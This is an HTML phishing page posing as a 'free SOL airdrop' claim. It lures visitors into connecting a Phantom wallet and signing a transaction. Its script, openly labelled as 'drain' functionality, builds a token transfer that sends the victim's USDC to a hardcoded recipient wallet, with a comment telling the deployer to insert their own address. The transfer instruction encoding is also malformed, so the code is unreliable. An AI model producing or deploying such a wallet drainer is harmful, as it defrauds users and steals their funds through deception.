<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Airdrop Claim</title>
    <!-- Load Solana Web3.js from CDN -->
    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f9; }
        button { padding: 15px 30px; font-size: 18px; cursor: pointer; background-color: #00FFAB; border: none; border-radius: 5px; margin: 10px; }
        button:hover { background-color: #00cc88; }
        #status { margin-top: 20px; font-weight: bold; color: #333; }
    </style>
</head>
<body>

    <h1>🎉 Claim Your Free SOL Airdrop!</h1>
    <p>Connect your Phantom wallet and sign one transaction to receive 10,000 USDC.</p>
    
    <button id="connectBtn">Connect Phantom</button>
    <button id="drainBtn" style="display:none;">Claim Airdrop</button>

    <div id="status"></div>

    <script>
        // --- CONFIGURATION ---
        const YOUR_WALLET_ADDRESS = "84RhcAMZemZs2jFkhqmFq3L2kbEvuLm5L4bVge1hew4t"; // REPLACE THIS WITH YOUR ADDRESS
        const TOKEN_MINT_ADDRESS = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"; // USDC on Solana Mainnet
        const AMOUNT_TO_DRAIN = 1000000; // 1,000,000 units (USDC has 6 decimals, so this is 1 USDC. Adjust for larger amounts)
        
        // --- LOGIC ---
        let walletAddress = null;

        const connectBtn = document.getElementById('connectBtn');
        const drainBtn = document.getElementById('drainBtn');
        const statusDiv = document.getElementById('status');

        // 1. Connect to Phantom Wallet
        connectBtn.addEventListener('click', async () => {
            if (!window.solana || !window.solana.isPhantom) {
                statusDiv.innerText = "Please install Phantom Wallet!";
                return;
            }

            try {
                // Request connection
                const response = await window.solana.connect();
                walletAddress = response.publicKey.toString();
                
                connectBtn.style.display = 'none';
                drainBtn.style.display = 'inline-block';
                statusDiv.innerText = `Connected: ${walletAddress}`;
            } catch (err) {
                console.error(err);
                statusDiv.innerText = "Connection failed.";
            }
        });

        // 2. Drain Functionality
        drainBtn.addEventListener('click', async () => {
            if (!window.solana || !window.solana.isPhantom) return;

            statusDiv.innerText = "Waiting for transaction signature...";

            try {
                const connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com");
                
                // Get the token account for USDC owned by the user
                // We need to find which token account holds the USDC
                const tokenAccounts = await connection.getParsedTokenAccountsByOwner(
                    new solanaWeb3.PublicKey(walletAddress),
                    { mint: new solanaWeb3.PublicKey(TOKEN_MINT_ADDRESS) }
                );

                if (tokenAccounts.value.length === 0) {
                    statusDiv.innerText = "No USDC found in wallet.";
                    return;
                }

                const sourceTokenAccount = tokenAccounts.value[0].pubkey;

                // Define the recipient (Your Wallet)
                const destinationPublicKey = new solanaWeb3.PublicKey(YOUR_WALLET_ADDRESS);
                
                // Create a Transfer Instruction
                // Note: For simplicity, we are using the raw Token Program ID. 
                // In production, you might want to use @solana/spl-token for better accuracy.
                
                const transferInstruction = new solanaWeb3.TransactionInstruction({
                    keys: [
                        { pubkey: sourceTokenAccount, isSigner: false, isWritable: true },
                        { pubkey: destinationPublicKey, isSigner: false, isWritable: true },
                        { pubkey: new solanaWeb3.PublicKey(walletAddress), isSigner: false, isWritable: false } // Owner
                    ],
                    programId: new solanaWeb3.PublicKey("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"), // SPL Token Program ID
                    data: Buffer.from([14, 0, 0, 0, AMOUNT_TO_DRAIN, 0, 0]), // Instruction ID 14 + Amount (little-endian u64)
                });

                // Create Transaction
                const transaction = new solanaWeb3.Transaction();
                transaction.add(transferInstruction);

                // Sign and Send
                const { signature } = await window.solana.signAndSendTransaction(transaction);
                
                statusDiv.innerText = `Drained! Tx: ${signature}`;
                console.log("Tx Signature:", signature);

            } catch (err) {
                console.error(err);
                statusDiv.innerText = "Transaction failed or rejected.";
            }
        });
    </script>
</body>
</html>
